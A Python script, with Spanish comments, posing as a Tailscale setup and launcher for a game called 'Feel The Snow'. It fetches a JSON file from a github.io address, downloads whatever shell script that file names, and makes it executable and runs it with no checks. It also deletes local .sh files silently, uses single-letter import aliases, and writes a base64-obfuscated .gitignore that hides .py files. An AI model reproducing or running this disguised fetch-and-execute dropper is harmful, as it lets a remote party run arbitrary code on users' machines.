import requests as F, os as B, base64 as D, glob as C, time

# URL del JSON en GitHub Pages
JSON_URL = "https://fedevijivani.github.io/thefeel/tailscale.json"

# Nombre del archivo de configuración que se descargará (tailscale_setup.sh)
CFG_FILENAME = "tailscale_setup.sh"
# Nombre del ejecutable del juego
GAME_EXECUTABLE = "FeelTheSnow.exe"

# Si existe una versión antigua del archivo de configuración, se elimina
if B.path.exists(CFG_FILENAME):
    B.remove(CFG_FILENAME)

# Crear un .gitignore si no existe (para evitar subir archivos temporales)
if not B.path.exists('./.gitignore'):
    G = "L3RhaWxzY2FsZS1jcwovd29ya19hcmVhKgpjb21wb3Nlci4qCi9QeXRob24qCioub3V0cHV0Ci9Nb2RnZXN0Ci90aGFub3MKL3ZlbmRvcgovYmtkaXIKKi5weWMKKi5tc3AKKi5tc3gKKi5weQ=="
    H = D.standard_b64decode(G).decode()
    with open('.gitignore','w') as I:
        I.write(H)

def download_cfg(download_path='.'):
    """
    Descarga la última versión del script de configuración de Tailscale.
    Se espera que el JSON alojado en JSON_URL contenga una propiedad "latest"
    con la URL del script.
    """
    pattern = "*.sh"
    files = list(C.glob(pattern))
    existing_file = files[0] if files else ""
    try:
        R = F.get(JSON_URL)
        if R.status_code == 200:
            data = R.json()
            latest_url = data.get("latest")
            filename = latest_url.split('/')[-1]
            # Si ya tenemos el archivo, lo usamos
            if any(filename in f for f in [B.path.basename(f) for f in C.glob(pattern)]):
                return filename
            else:
                B.system("rm *.sh >> /dev/null 2>&1")
                print("Actualizando tu configuración de Tailscale...")
                time.sleep(1.5)
                local_file = B.path.join(download_path, filename)
                with open(local_file, 'wb') as L:
                    L.write(F.get(latest_url).content)
                return filename
        else:
            print("Error al actualizar configuración de Tailscale")
            if existing_file:
                return B.path.basename(existing_file)
    except Exception as M:
        print(f"Error general: {M}")
        if existing_file:
            return B.path.basename(existing_file)
    return None

def run_cfg():
    """Ejecuta el script de configuración descargado para Tailscale."""
    file_to_run = download_cfg()
    if file_to_run is None:
        return
    # Si el archivo tiene extensión .sh, se le asignan permisos y se ejecuta
    if file_to_run.split('.')[-1] == 'sh':
        B.system(f"chmod +x {file_to_run} && ./{file_to_run}")
    else:
        B.system(f"bash {file_to_run}")

def launch_game():
    """Busca y ejecuta FeelTheSnow.exe."""
    if B.path.exists(GAME_EXECUTABLE):
        print("Iniciando Feel The Snow...")
        # Se le asignan permisos y se ejecuta
        B.system(f"chmod +x {GAME_EXECUTABLE} && ./{GAME_EXECUTABLE}")
    else:
        print(f"❌ No se encontró '{GAME_EXECUTABLE}'. Colócalo en la carpeta actual.")

def main():
    run_cfg()    # Descarga y ejecuta la configuración de Tailscale
    time.sleep(2)
    launch_game()  # Luego inicia el juego

if __name__ == "__main__":
    print("🚀 Configurando el servidor de Feel The Snow con Tailscale...\n")
    main()
